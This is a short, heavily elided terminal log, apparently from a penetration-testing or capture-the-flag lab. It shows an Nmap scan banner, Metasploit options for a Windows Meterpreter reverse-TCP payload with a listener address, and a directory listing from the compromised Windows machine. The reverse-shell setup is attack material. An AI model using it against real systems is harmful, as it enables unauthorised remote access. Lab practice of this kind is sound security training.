...
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 15:08 +08
...
Payload options (windows/meterpreter/reverse_tcp):
   ...
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     192.168.187.130  yes       The listen address (an interface may b
                                        e specified)
...
04/12/2017  05:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)  18,086,752,256 bytes free
